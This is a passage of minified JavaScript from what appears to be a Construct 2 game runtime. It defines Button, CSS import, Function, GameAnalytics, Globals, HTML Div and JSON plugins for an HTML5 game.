ret.set_any(0)},Exps.prototype.ScreenWidth=function(t){t.set_int(screen.width)},Exps.prototype.ScreenHeight=function(t){t.set_int(screen.height)},Exps.prototype.DevicePixelRatio=function(t){t.set_float(this.runtime.devicePixelRatio)},Exps.prototype.WindowInnerWidth=function(t){t.set_int(window.innerWidth)},Exps.prototype.WindowInnerHeight=function(t){t.set_int(window.innerHeight)},Exps.prototype.WindowOuterWidth=function(t){t.set_int(window.outerWidth)},Exps.prototype.WindowOuterHeight=function(t){t.set_int(window.outerHeight)},pluginProto.exps=new Exps}(),cr.plugins_.Button=function(t){this.runtime=t},function(){var t=cr.plugins_.Button.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function s(){}e.onCreate=function(){var e;this.runtime.isDomFree?cr.logexport("[Construct 2] Button plugin not supported on this platform - the object will not be created"):(this.isCheckbox=1===this.properties[0],this.inputElem=document.createElement("input"),this.isCheckbox?this.elem=document.createElement("label"):this.elem=this.inputElem,this.labelText=null,this.inputElem.type=this.isCheckbox?"checkbox":"button",this.inputElem.id=this.properties[6],jQuery(this.elem).appendTo(this.runtime.canvasdiv||"body"),this.isCheckbox?(jQuery(this.inputElem).appendTo(this.elem),this.labelText=document.createTextNode(this.properties[1]),jQuery(this.elem).append(this.labelText),this.inputElem.checked=0!==this.properties[7],jQuery(this.elem).css("font-family","sans-serif"),jQuery(this.elem).css("display","inline-block"),jQuery(this.elem).css("color","black")):this.inputElem.value=this.properties[1],this.elem.title=this.properties[2],this.inputElem.disabled=0===this.properties[4],this.autoFontSize=0!==this.properties[5],this.element_hidden=!1,0===this.properties[3]&&(jQuery(this.elem).hide(),this.visible=!1,this.element_hidden=!0),this.inputElem.onclick=(e=this,function(t){t.stopPropagation(),e.runtime.isInUserInputEvent=!0,e.runtime.trigger(cr.plugins_.Button.prototype.cnds.OnClicked,e),e.runtime.isInUserInputEvent=!1}),this.elem.addEventListener("touchstart",function(t){t.stopPropagation()},!1),this.elem.addEventListener("touchmove",function(t){t.stopPropagation()},!1),this.elem.addEventListener("touchend",function(t){t.stopPropagation()},!1),jQuery(this.elem).mousedown(function(t){t.stopPropagation()}),jQuery(this.elem).mouseup(function(t){t.stopPropagation()}),jQuery(this.elem).keydown(function(t){t.stopPropagation()}),jQuery(this.elem).keyup(function(t){t.stopPropagation()}),this.lastLeft=0,this.lastTop=0,this.lastRight=0,this.lastBottom=0,this.lastWinWidth=0,this.lastWinHeight=0,this.updatePosition(!0),this.runtime.tickMe(this))},e.saveToJSON=function(){var t={tooltip:this.elem.title,disabled:!!this.inputElem.disabled};return this.isCheckbox?(t.checked=!!this.inputElem.checked,t.text=this.labelText.nodeValue):t.text=this.elem.value,t},e.loadFromJSON=function(t){this.elem.title=t.tooltip,this.inputElem.disabled=t.disabled,this.isCheckbox?(this.inputElem.checked=t.checked,this.labelText.nodeValue=t.text):this.elem.value=t.text},e.onDestroy=function(){this.runtime.isDomFree||(jQuery(this.elem).remove(),this.elem=null)},e.tick=function(){this.updatePosition()},e.updatePosition=function(t){if(!this.runtime.isDomFree){var e=this.layer.layerToCanvas(this.x,this.y,!0),i=this.layer.layerToCanvas(this.x,this.y,!1),s=this.layer.layerToCanvas(this.x+this.width,this.y+this.height,!0),n=this.layer.layerToCanvas(this.x+this.width,this.y+this.height,!1),r=this.runtime.width/this.runtime.devicePixelRatio,o=this.runtime.height/this.runtime.devicePixelRatio;if(!this.visible||!this.layer.visible||s<=0||n<=0||r<=e||o<=i)return this.element_hidden||jQuery(this.elem).hide(),void(this.element_hidden=!0);e<1&&(e=1),i<1&&(i=1),r<=s&&(s=r-1),o<=n&&(n=o-1);r=window.innerWidth,o=window.innerHeight;t||this.lastLeft!==e||this.lastTop!==i||this.lastRight!==s||this.lastBottom!==n||this.lastWinWidth!==r||this.lastWinHeight!==o?(this.lastLeft=e,this.lastTop=i,this.lastRight=s,this.lastBottom=n,this.lastWinWidth=r,this.lastWinHeight=o,this.element_hidden&&(jQuery(this.elem).show(),this.element_hidden=!1),r=Math.round(e)+jQuery(this.runtime.canvas).offset().left,o=Math.round(i)+jQuery(this.runtime.canvas).offset().top,jQuery(this.elem).css("position","absolute"),jQuery(this.elem).offset({left:r,top:o}),jQuery(this.elem).width(Math.round(s-e)),jQuery(this.elem).height(Math.round(n-i)),this.autoFontSize&&jQuery(this.elem).css("font-size",this.layer.getScale(!0)/this.runtime.devicePixelRatio-.2+"em")):this.element_hidden&&(jQuery(this.elem).show(),this.element_hidden=!1)}},e.draw=function(t){},e.drawGL=function(t){},i.prototype.OnClicked=function(){return!0},i.prototype.IsChecked=function(){return this.isCheckbox&&this.inputElem.checked},t.cnds=new i,s.prototype.SetText=function(t){this.runtime.isDomFree||(this.isCheckbox?this.labelText.nodeValue=t:this.elem.value=t)},s.prototype.SetTooltip=function(t){this.runtime.isDomFree||(this.elem.title=t)},s.prototype.SetVisible=function(t){this.runtime.isDomFree||(this.visible=0!==t)},s.prototype.SetEnabled=function(t){this.runtime.isDomFree||(this.inputElem.disabled=0===t)},s.prototype.SetFocus=function(){this.runtime.isDomFree||this.inputElem.focus()},s.prototype.SetBlur=function(){this.runtime.isDomFree||this.inputElem.blur()},s.prototype.SetCSSStyle=function(t,e){this.runtime.isDomFree||jQuery(this.elem).css(t,e)},s.prototype.SetChecked=function(t){!this.runtime.isDomFree&&this.isCheckbox&&(this.inputElem.checked=1===t)},s.prototype.ToggleChecked=function(){!this.runtime.isDomFree&&this.isCheckbox&&(this.inputElem.checked=!this.inputElem.checked)},t.acts=new s,t.exps=new function(){}}();var lastCSS="",importList=[];function importcssfile(t){var e;-1==importList.indexOf(t)&&((e=document.createElement("link")).setAttribute("rel","stylesheet"),e.setAttribute("type","text/css"),e.setAttribute("href",t),document.getElementsByTagName("head")[0].appendChild(e),importList.push(t))}function removecssfile(t){for(var e=document.getElementsByTagName("link"),i=e.length;0<=i;i--)e[i]&&null!=e[i].getAttribute("href")&&-1!=e[i].getAttribute("href").indexOf(t)&&e[i].parentNode.removeChild(e[i]);importList.splice(importList.indexOf(t),1)}Array.prototype.indexOf||(Array.prototype.indexOf=function(t,e){e=e||0;for(var i=this.length;e<i;){if(this[e]===t)return e;++e}return-1}),cr.plugins_.CSS_import=function(t){this.runtime=t},function(){var t=cr.plugins_.CSS_import.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype;e.onCreate=function(){""!=this.properties[0]&&(importcssfile(this.properties[0]),lastCSS=this.properties[0])},e.onDestroy=function(){},e.draw=function(t){},e.drawGL=function(t){},t.cnds={},t.cnds.CompareCSS=function(t,e){return this.properties[0]===t},t.acts={},(e=t.acts).SetCSS=function(t){importcssfile(t),lastCSS=t},e.RemCSS=function(t){removecssfile(t)},t.exps={},t.exps.GetCSS=function(t){""!=lastCSS?t.set_string(lastCSS):""!=this.properties[0]?t.set_string(this.properties[0]):t.set_string("")}}(),cr.plugins_.Function=function(t){this.runtime=t},function(){var t=cr.plugins_.Function.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype,i=[],s=-1;function n(){this.name="",this.retVal=0,this.params=[]}function a(){return++s===i.length&&i.push(new n),i[s]}function r(){return s<0?null:i[s]}function h(){s--}function o(){}function c(){}function l(){}e.onCreate=function(){0;var o=this;window.c2_callFunction=function(t,e){var i,s,n,r=a();if(r.name=t.toLowerCase(),r.retVal=0,e)for(r.params.length=e.length,i=0,s=e.length;i<s;++i)n=e[i],r.params[i]="number"==typeof n||"string"==typeof n?n:"boolean"==typeof n&&n?1:0;else cr.clearArray(r.params);return o.runtime.trigger(cr.plugins_.Function.prototype.cnds.OnFunction,o,r.name),h(),r.retVal}},o.prototype.OnFunction=function(t){var e=r();return!!e&&cr.equals_nocase(t,e.name)},o.prototype.CompareParam=function(t,e,i){var s=r();return!!s&&(!((t=cr.floor(t))<0||t>=s.params.length)&&cr.do_cmp(s.params[t],e,i))},t.cnds=new o,c.prototype.CallFunction=function(t,e){var i=a();i.name=t.toLowerCase(),i.retVal=0,cr.shallowAssignArray(i.params,e);this.runtime.trigger(cr.plugins_.Function.prototype.cnds.OnFunction,this,i.name);h()},c.prototype.SetReturnValue=function(t){var e=r();e&&(e.retVal=t)},c.prototype.CallExpression=function(t){},t.acts=new c,l.prototype.ReturnValue=function(t){var e=function(){if(!i.length)return null;var t=s+1;return t>=i.length&&(t=i.length-1),i[t]}();e?t.set_any(e.retVal):t.set_int(0)},l.prototype.ParamCount=function(t){var e=r();e?t.set_int(e.params.length):t.set_int(0)},l.prototype.Param=function(t,e){e=cr.floor(e);var i=r();i&&0<=e&&e<i.params.length?t.set_any(i.params[e]):t.set_int(0)},l.prototype.Call=function(t,e){var i,s,n=a();for(n.name=e.toLowerCase(),n.retVal=0,cr.clearArray(n.params),i=2,s=arguments.length;i<s;i++)n.params.push(arguments[i]);this.runtime.trigger(cr.plugins_.Function.prototype.cnds.OnFunction,this,n.name);h(),t.set_any(n.retVal)},t.exps=new l}(),cr.plugins_.GameAnalytics=function(t){this.runtime=t},function(){var t=cr.plugins_.GameAnalytics.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}e.onCreate=function(){this.build=this.properties[0],this.customUserId=this.properties[1],this.enableManualSessionHandling=this.properties[2],this.enableInfoLog=this.properties[3],this.enableVerboseLog=this.properties[4],this.gameKeyBrowser=this.properties[5],this.secretKeyBrowser=this.properties[6],this.gameKeyAndroid=this.properties[7],this.secretKeyAndroid=this.properties[8],this.gameKeyIOS=this.properties[9],this.secretKeyIOS=this.properties[10],this.customDimensions01=[],this.customDimensions02=[],this.customDimensions03=[],this.resourceCurrencies=[],this.resourceItemTypes=[]},e.onDestroy=function(){},e.saveToJSON=function(){return{}},e.loadFromJSON=function(t){},e.draw=function(t){},e.drawGL=function(t){},t.cnds=new function(){},i.prototype.addAvailableCustomDimension01=function(t){this.customDimensions01.push(t)},i.prototype.addAvailableCustomDimension02=function(t){this.customDimensions02.push(t)},i.prototype.addAvailableCustomDimension03=function(t){this.customDimensions03.push(t)},i.prototype.addAvailableResourceCurrency=function(t){this.resourceCurrencies.push(t)},i.prototype.addAvailableResourceItemType=function(t){this.resourceItemTypes.push(t)},i.prototype.initialize=function(){var t,e;"function"==typeof window.GameAnalytics.initialize?(this.enableInfoLog&&GameAnalytics.setEnabledInfoLog(!0),this.enableVerboseLog&&GameAnalytics.setEnabledVerboseLog(!0),this.enableManualSessionHandling&&GameAnalytics.setEnabledManualSessionHandling(!0),0<this.customDimensions01.length&&GameAnalytics.configureAvailableCustomDimensions01(this.customDimensions01),0<this.customDimensions02.length&&GameAnalytics.configureAvailableCustomDimensions02(this.customDimensions02),0<this.customDimensions03.length&&GameAnalytics.configureAvailableCustomDimensions03(this.customDimensions03),0<this.resourceCurrencies.length&&GameAnalytics.configureAvailableResourceCurrencies(this.resourceCurrencies),0<this.resourceItemTypes.length&&GameAnalytics.configureAvailableResourceItemTypes(this.resourceItemTypes),GameAnalytics.configureBuild(this.build),t="Android"===device.platform?this.gameKeyAndroid:this.gameKeyIOS,e="Android"===device.platform?this.secretKeyAndroid:this.secretKeyIOS,GameAnalytics.initialize({gameKey:t,secretKey:e,sdkVersion:"construct 1.1.1"})):void 0!==window.gameanalytics.GameAnalytics?(e=window.gameanalytics.GameAnalytics,this.enableInfoLog&&e.setEnabledInfoLog(!0),this.enableVerboseLog&&e.setEnabledVerboseLog(!0),this.enableManualSessionHandling&&e.setEnabledManualSessionHandling(!0),0<this.customDimensions01.length&&e.configureAvailableCustomDimensions01(this.customDimensions01),0<this.customDimensions02.length&&e.configureAvailableCustomDimensions02(this.customDimensions02),0<this.customDimensions03.length&&e.configureAvailableCustomDimensions03(this.customDimensions03),0<this.resourceCurrencies.length&&e.configureAvailableResourceCurrencies(this.resourceCurrencies),0<this.resourceItemTypes.length&&e.configureAvailableResourceItemTypes(this.resourceItemTypes),e.configureBuild(this.build),e.configureSdkGameEngineVersion("construct 1.1.1"),e.initialize(this.gameKeyBrowser,this.secretKeyBrowser)):console.log("initialize: GameAnalytics object not found")},i.prototype.addBusinessEvent=function(t,e,i,s,n){"function"==typeof window.GameAnalytics.addBusinessEvent?GameAnalytics.addBusinessEvent({currency:t,amount:e,itemType:i,itemId:s,cartType:n}):void 0!==window.gameanalytics.GameAnalytics?window.gameanalytics.GameAnalytics.addBusinessEvent(t,e,i,s,n):console.log("addBusinessEvent: GameAnalytics object not found")},i.prototype.addResourceEvent=function(t,e,i,s,n){"function"==typeof window.GameAnalytics.addResourceEvent?GameAnalytics.addResourceEvent({flowType:t,currency:e,amount:i,itemType:s,itemId:n}):void 0!==window.gameanalytics.GameAnalytics?window.gameanalytics.GameAnalytics.addResourceEvent(t,e,i,s,n):console.log("addResourceEvent: GameAnalytics object not found")},i.prototype.addProgressionEvent=function(t,e,i,s){"function"==typeof window.GameAnalytics.addProgressionEvent?GameAnalytics.addProgressionEvent({progressionStatus:t,progression01:e,progression02:i,progression03:s}):void 0!==window.gameanalytics.GameAnalytics?window.gameanalytics.GameAnalytics.addProgressionEvent(t,e,i,s):console.log("addProgressionEvent: GameAnalytics object not found")},i.prototype.addProgressionEventWithScore=function(t,e,i,s,n){"function"==typeof window.GameAnalytics.addProgressionEvent?GameAnalytics.addProgressionEvent({progressionStatus:t,progression01:e,progression02:i,progression03:s,score:n}):void 0!==window.gameanalytics.GameAnalytics?window.gameanalytics.GameAnalytics.addProgressionEvent(t,e,i,s,n):console.log("addProgressionEventWithScore: GameAnalytics object not found")},i.prototype.addDesignEvent=function(t){"function"==typeof window.GameAnalytics.addDesignEvent?GameAnalytics.addDesignEvent({eventId:t}):void 0!==window.gameanalytics.GameAnalytics?window.gameanalytics.GameAnalytics.addDesignEvent(t):console.log("addDesignEvent: GameAnalytics object not found")},i.prototype.addDesignEventWithValue=function(t,e){"function"==typeof window.GameAnalytics.addDesignEvent?GameAnalytics.addDesignEvent({eventId:t,value:e}):void 0!==window.gameanalytics.GameAnalytics?window.gameanalytics.GameAnalytics.addDesignEvent(t,e):console.log("addDesignEventWithValue: GameAnalytics object not found")},i.prototype.addErrorEvent=function(t,e){"function"==typeof window.GameAnalytics.addErrorEvent?GameAnalytics.addErrorEvent({severity:t,message:e}):void 0!==window.gameanalytics.GameAnalytics?window.gameanalytics.GameAnalytics.addErrorEvent(t,e):console.log("addErrorEvent: GameAnalytics object not found")},i.prototype.setEnabledManualSessionHandling=function(t){"function"==typeof window.GameAnalytics.setEnabledManualSessionHandling?GameAnalytics.setEnabledManualSessionHandling(!!t):void 0!==window.gameanalytics.GameAnalytics?window.gameanalytics.GameAnalytics.setEnabledManualSessionHandling(!!t):console.log("setEnabledManualSessionHandling: GameAnalytics object not found")},i.prototype.setCustomDimension01=function(t){"function"==typeof window.GameAnalytics.setCustomDimension01?GameAnalytics.setCustomDimension01(t):void 0!==window.gameanalytics.GameAnalytics?window.gameanalytics.GameAnalytics.setCustomDimension01(t):console.log("setCustomDimension01: GameAnalytics object not found")},i.prototype.setCustomDimension02=function(t){"function"==typeof window.GameAnalytics.setCustomDimension02?GameAnalytics.setCustomDimension02(t):void 0!==window.gameanalytics.GameAnalytics?window.gameanalytics.GameAnalytics.setCustomDimension02(t):console.log("setCustomDimension02: GameAnalytics object not found")},i.prototype.setCustomDimension03=function(t){"function"==typeof window.GameAnalytics.setCustomDimension03?GameAnalytics.setCustomDimension03(t):void 0!==window.gameanalytics.GameAnalytics?window.gameanalytics.GameAnalytics.setCustomDimension03(t):console.log("setCustomDimension03: GameAnalytics object not found")},i.prototype.setFacebookId=function(t){"function"==typeof window.GameAnalytics.setFacebookId?GameAnalytics.setFacebookId(t):void 0!==window.gameanalytics.GameAnalytics?window.gameanalytics.GameAnalytics.setFacebookId(t):console.log("setFacebookId: GameAnalytics object not found")},i.prototype.setGender=function(t){"function"==typeof window.GameAnalytics.setGender?GameAnalytics.setGender(t):void 0!==window.gameanalytics.GameAnalytics?window.gameanalytics.GameAnalytics.setGender(t):console.log("setGender: GameAnalytics object not found")},i.prototype.setBirthYear=function(t){"function"==typeof window.GameAnalytics.setBirthYear?GameAnalytics.setBirthYear(t):void 0!==window.gameanalytics.GameAnalytics?window.gameanalytics.GameAnalytics.setBirthYear(t):console.log("setBirthYear: GameAnalytics object not found")},i.prototype.startSession=function(){"function"==typeof window.GameAnalytics.startSession?GameAnalytics.startSession():void 0!==window.gameanalytics.GameAnalytics?window.gameanalytics.GameAnalytics.startSession():console.log("startSession: GameAnalytics object not found")},i.prototype.endSession=function(){"function"==typeof window.GameAnalytics.endSession?GameAnalytics.endSession():void 0!==window.gameanalytics.GameAnalytics?window.gameanalytics.GameAnalytics.endSession():console.log("endSession: GameAnalytics object not found")},t.acts=new i,t.exps=new function(){}}(),cr.plugins_.Globals=function(t){this.runtime=t},function(){var t=cr.plugins_.Globals.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function s(){}e.onCreate=function(){this.defaultVarsValues=JSON.stringify(this.instance_vars)},e.saveToJSON=function(){return{v:JSON.stringify(this.instance_vars)}},e.loadFromJSON=function(t){this.instance_vars=JSON.parse(t.v)},t.cnds=new function(){},i.prototype.ResetVariables=function(){this.instance_vars=JSON.parse(this.defaultVarsValues)},i.prototype.LoadVariables=function(t){this.instance_vars=JSON.parse(t)},t.acts=new i,s.prototype.GetVariablesAsJSON=function(t){t.set_string(JSON.stringify(this.instance_vars))},t.exps=new s}(),cr.plugins_.HTML_Div_Pode=function(t){this.runtime=t},function(){var t=cr.plugins_.HTML_Div_Pode.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime,this.divloaded=0};var e=t.Instance.prototype;e.onCreate=function(){this.elem=document.createElement("div"),this.elem.innerHTML=this.properties[1],this.elem.style.cssText=this.properties[2],this.CSSstyle=this.properties[2];var t=0<this.width?1:-1,e=0<this.height?1:-1;this.elem.setAttribute("id",this.properties[3]),this.angle2D=this.angle,this.rotation2D="-webkit-transform:rotate("+this.angle*t*e*180/3.1416+"deg);-moz-transform:rotate("+this.angle*t*e*180/3.1416+"deg);-o-transform:rotate("+this.angle*t*e*180/3.1416+"deg);",this.elem.style.cssText+=";"+this.rotation2D,this.elem.width=Math.round(this.elem.width),this.elem.height=Math.round(this.elem.height),this.elem.x=Math.round(this.elem.x),this.elem.y=Math.round(this.elem.y),jQuery(this.elem).appendTo("body"),0===this.properties[0]&&(jQuery(this.elem).hide(),this.visible=!1),this.updatePosition(),this.runtime.tickMe(this)},e.onDestroy=function(){jQuery(this.elem).remove(),this.elem=null},e.tick=function(){this.updatePosition()},e.updatePosition=function(){var t,e,i=this.layer.layerToCanvas(this.x,this.y,!0),s=this.layer.layerToCanvas(this.x,this.y,!1),n=this.layer.layerToCanvas(this.x+this.width,this.y+this.height,!0),r=this.layer.layerToCanvas(this.x+this.width,this.y+this.height,!1);!this.visible||!this.layer.visible||n<=0||r<=0||i>=this.runtime.width||s>=this.runtime.height?jQuery(this.elem).hide():(i<1&&(i=1),s<1&&(s=1),n>=this.runtime.width&&(n=this.runtime.width-1),r>=this.runtime.height&&(r=this.runtime.height-1),jQuery(this.elem).show(),t=i+jQuery(this.runtime.canvas).offset().left,e=s+jQuery(this.runtime.canvas).offset().top,jQuery(this.elem).offset({left:t,top:e}),jQuery(this.elem).width(n-i),jQuery(this.elem).height(r-s),this.elem.width=Math.round(this.elem.width),this.elem.height=Math.round(this.elem.height),this.elem.x=Math.round(this.elem.x),this.elem.y=Math.round(this.elem.y))},e.draw=function(t){},e.drawGL=function(t){},t.cnds={},(e=t.cnds).CompareinnerHTML=function(t,e){return this.elem.innerHTML===t},e.CompareStyle=function(t,e){return this.elem.style.cssText===t},e.OnComplete=function(t){return!0},e.OnError=function(){return!0},e.isFocused=function(){return this.elem==document.activeElement},t.acts={},(e=t.acts).SetInnerHTML=function(t){this.elem.innerHTML=t},e.rotate3d=function(t,e,i,s){var n="";1==t&&(this.angle3DX=this.angle3DX+s,n="-webkit-transform:rotateX("+this.angle3DX+"deg);-moz-transform:rotateX("+this.angle3DX+"deg);-o-transform:rotateX("+this.angle3DX+"deg);-ms-transform:rotateX("+this.angle3DX+"deg);transform:rotateX("+this.angle3DX+"deg);"),1==e&&(this.angle3DY=this.angle3DY+s,n=n+"-webkit-transform:rotateY("+this.angle3DY+"deg);-moz-transform:rotateY("+this.angle3DY+"deg);-o-transform:rotateY("+this.angle3DY+"deg);-ms-transform:rotateY("+this.angle3DY+"deg);transform:rotateY("+this.angle3DY+"deg);"),1==i&&(this.angle3DZ=this.angle3DZ+s,n=n+"-webkit-transform:rotateZ("+this.angle3DZ+"deg);-moz-transform:rotateZ("+this.angle3DZ+"deg);-o-transform:rotateZ("+this.angle3DZ+"deg);-ms-transform:rotateZ("+this.angle3DZ+"deg);transform:rotateZ("+this.angle3DZ+"deg);"),this.rotation3D=n,this.elem.style.cssText=this.CSSstyle+this.rotation2D+this.perspectiveValue+this.rotation3D,this.updatePosition()},e.rotate2d=function(t){var e=0<this.width?1:-1,i=0<this.height?1:-1;this.rotation2D="-webkit-transform:rotate("+t*e*i*180/3.1416+"deg);-moz-transform:rotate("+t*e*i*180/3.1416+"deg);-o-transform:rotate("+t*e*i*180/3.1416+"deg);",this.elem.style.cssText=this.CSSstyle+this.rotation2D+this.perspectiveValue+this.rotation3D,this.angle=this.angle2D+180*t/3.1416},e.setPerspective=function(t){this.perspectiveValue="-webkit-perspective:"+t+";-moz-perspective:"+t+";-o-perspective:"+t+";-ms-perspective:"+t+";perspective:"+t+";",this.elem.style.cssText=this.CSSstyle+this.rotation2D+this.perspectiveValue+this.rotation3D},e.LoadDiv=function(t,e){e.length?jQuery.ajax({context:this,dataType:"text",type:"POST",url:t,data:e,success:function(t){this.elem.innerHTML=t,this.runtime.trigger(cr.plugins_.HTML_Div.prototype.cnds.OnComplete,this)},error:function(){this.runtime.trigger(cr.plugins_.HTML_Div.prototype.cnds.OnError,this)}}):jQuery.ajax({context:this,dataType:"text",type:"GET",url:t,success:function(t){this.elem.innerHTML=t,this.runtime.trigger(cr.plugins_.HTML_Div.prototype.cnds.OnComplete,this)},error:function(){this.runtime.trigger(cr.plugins_.HTML_Div.prototype.cnds.OnError,this)}})},e.SetStyle=function(t){this.CSSstyle=t,this.elem.style.cssText=this.CSSstyle+this.rotation2D+this.perspectiveValue+this.rotation3D},e.SetVisible=function(t){this.visible=0!==t},e.setFocus=function(){this.elem.focus()},t.exps={},(t=t.exps).GetInnerHTML=function(t){t.set_string(this.elem.innerHTML)},t.GetStyle=function(t){t.set_string(this.elem.style.cssText)}}(),cr.plugins_.JSON=function(t){this.runtime=t,this.references={}},function(){var d,g,f,m,y,n,r,_,o,s=(d=JSON,e=RegExp,f="\\x"+("0"+(g="~").charCodeAt(0).toString(16)).slice(-2),m="\\"+f,y=new e(f,"g"),n=new e(m,"g"),r=new e("(?:^|([^\\\\]))"+m),_=[].indexOf||function(t){for(var e=this.length;e--&&this[e]!==t;);return e},o=String,{stringify:function(t,e,i,s){return d.stringify(t,(n=e,a=[],h=[t=t],c=[t],l=[(r=!s)?g:"[Circular]"],u=t,p=1,function(t,e){return n&&(e=n.call(this,t,e)),""!==t&&(u!==this&&(o=p-_.call(h,this)-1,p-=o,h.splice(p,h.length),a.splice(p-1,a.length),u=this),"object"==typeof e&&e?(_.call(h,e)<0&&h.push(u=e),p=h.length,(o=_.call(c,e))<0?(o=c.push(e)-1,r?(a.push((""+t).replace(y,f)),l[o]=g+a.join(g)):l[o]=l[0]):e=l[o]):"string"==typeof e&&r&&(e=e.replace(f,m).replace(g,f))),e}),i);var n,r,o,a,h,c,l,u,p},parse:function(t,e){return d.parse(t,(s=e,function(t,e){var i="string"==typeof e;return i&&e.charAt(0)===g?new o(e.slice(1)):(""===t&&(e=a(e,e,{})),i&&(e=e.replace(r,"$1"+g).replace(m,f)),s?s.call(this,t,e):e)}));var s}});function a(t,e,i){return e instanceof Array?function(t,e,i){for(var s=0,n=e.length;s<n;s++)e[s]=a(t,e[s],i);return e}(t,e,i):e instanceof o?e.length?i.hasOwnProperty(e)?i[e]:i[e]=function(t,e){for(var i=0,s=e.length;i<s;t=t[e[i++].replace(n,g)]);return t}(t,e.split(g)):t:e instanceof Object?function(t,e,i){for(var s in e)e.hasOwnProperty(s)&&(e[s]=a(t,e[s],i));return e}(t,e,i):e}var t=cr.plugins_.JSON.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype,h="root";function c(t){return void 0===t?"undefined":null===t?"null":t===!!t?"boolean":"[object Number]"===Object.prototype.toString.call(t)?"number":"[object String]"===Object.prototype.toString.call(t)?"string":"[object Array]"===Object.prototype.toString.call(t)?"array":"[object Object]"===Object.prototype.toString.call(t)?"object":void 0}function i(){}function l(){}function u(){}e.onCreate=function(){this.data={},this.curKey="",this.curValue=void 0,this.curPath=[]},e.onDestroy=function(){this.data=null,this.curKey=null,this.curPath=null,this.curValue=null;var t,e=this.type.plugin.references;for(t in e)Object.prototype.hasOwnProperty.call(e,t)&&e[t].origin===this&&delete e[t]},e.saveToJSON=function(){return this.data[h]},e.loadFromJSON=function(t){this.data[h]=t},e.getValueFromPath=function(t,e){if(t)return this.getValueFromPath(!1,this.curPath.concat(e));for(var i=[h].concat(e),s=this.data,n=0;n<i.length;n++){if(void 0===s){logInvalidPath(e);break}if(null===s){n<i.length-1&&(logInvalidPath(e),s=void 0);break}s=s[i[n]]}return s},e.setValueFromPath=function(t,e,i){if(t)i=this.setValueFromPath(!1,this.curPath.concat(e),i);else for(var s=[h].concat(e),n=this.data,r=0;r<s.length;r++){if("array"!==c(o=n)&&"object"!==c(o))return void logInvalidPath(e);r<s.length-1?n=n[s[r]]:n[s[r]]=i}var o},i.prototype.OnJSONParseError=function(){return!0},i.prototype.IsObject=function(t,e){return"object"===c(this.getValueFromPath(1===t,e))},i.prototype.IsArray=function(t,e){return"array"===c(this.getValueFromPath(1===t,e))},i.prototype.IsBoolean=function(t,e){return"boolean"===c(this.getValueFromPath(1===t,e))},i.prototype.IsNumber=function(t,e){return"number"===c(this.getValueFromPath(1===t,e))},i.prototype.IsString=function(t,e){return"string"===c(this.getValueFromPath(1===t,e))},i.prototype.IsNull=function(t,e){return"null"===c(this.getValueFromPath(1===t,e))},i.prototype.IsUndefined=function(t,e){return void 0===this.getValueFromPath(1===t,e)},i.prototype.IsEmpty=function(t,e){var i,s=this.getValueFromPath(1===t,e),e=c(s);if("array"===e)return 0===s.length;if("object"!==e)return void 0===s;for(i in s)if(Object.prototype.hasOwnProperty.call(s,i))return!1;return!0},i.prototype.ForEachProperty=function(t,e){var i,s=this.runtime.getCurrentEventStack(),n=s.current_event,r=s.isModifierAfterCnds(),o=this.runtime.pushLoopStack(),s=this.curPath,a=1===t?this.curPath.concat(e):e,h=this.getValueFromPath(!1,a);if(r){for(i in h)if(Object.prototype.hasOwnProperty.call(h,i)&&(this.curPath=a.concat(i),this.curKey=i,this.curValue=h[i],this.runtime.pushCopySol(n.solModifiers),n.retrigger(),this.runtime.popSol(n.solModifiers),o.stopped))break}else for(i in h)if(Object.prototype.hasOwnProperty.call(h,i)&&(this.curPath=a.concat(i),this.curKey=i,this.curValue=h[i],n.retrigger(),o.stopped))break;return this.curPath=s,this.curKey="",this.curValue=void 0,this.runtime.popLoopStack(),!1},i.prototype.ReferenceExists=function(t){return t in this.type.plugin.references},t.cnds=new i,l.prototype.NewObject=function(t,e){this.setValueFromPath(t,e,{})},l.prototype.NewArray=function(t,e){this.setValueFromPath(t,e,[])},l.prototype.SetValue=function(t,e,i){this.setValueFromPath(e,i,t)},l.prototype.SetBoolean=function(t,e,i){this.setValueFromPath(e,i,0===t)},l.prototype.SetNull=function(t,e){this.setValueFromPath(t,e,null)},l.prototype.Delete=function(t,e){var i;function s(t,e){null!=t?"object"===c(t)&&void 0!==t[e]?delete t[e]:"array"===c(t)&&"number"===c(e)&&t.splice(Math.floor(e),1):logInvalidPath(i)}0===(i=t?this.curPath.concat(e):e).length?s(this.data,h):s(this.getValueFromPath(!1,i.slice(0,i.length-1)),i[i.length-1])},l.prototype.Clear=function(t,e){var n;function i(t,e){if(null!=t&&"object"==typeof t){var i=c(t[e]);if("array"===i)t[e].length=0;else if("object"===i)for(var s in t[e])Object.prototype.hasOwnProperty.call(t[e],s)&&delete t[e][s];else delete t[e]}else logInvalidPath(n)}0===(n=t?this.curPath.concat(e):e).length?i(this.data,h):i(this.getValueFromPath(!1,n.slice(0,n.length-1)),n[n.length-1])},e.LoadJSON=function(t,e,i){try{this.setValueFromPath(e,i,s.parse(t))}catch(t){console.warn("LoadJSON error:",t),this.runtime.trigger(cr.plugins_.JSON.prototype.cnds.OnJSONParseError,this)}},l.prototype.LoadJSON=function(t,e,i){this.LoadJSON(t,e,i)},l.prototype.LogData=function(){var t=void 0!==console.groupCollapsed&&void 